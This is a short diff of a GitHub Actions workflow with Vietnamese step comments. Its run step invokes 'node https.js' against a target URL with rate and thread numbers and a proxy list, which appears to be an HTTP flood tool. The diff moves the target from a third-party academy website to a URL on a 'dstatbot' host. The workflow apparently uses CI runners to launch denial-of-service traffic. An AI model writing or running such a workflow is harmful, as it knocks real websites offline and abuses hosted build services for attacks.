@@ -29,4 +29,4 @@ jobs:
 
       # Chạy file với hệ số
       - name: Chạy Tool
-        run: node https.js https://dgmd.academy/ 500 500 500 proxy.txt
+        run: node https.js https://c2.dstatbot.win/X6VMAZfS 300 500 500 proxy.txt
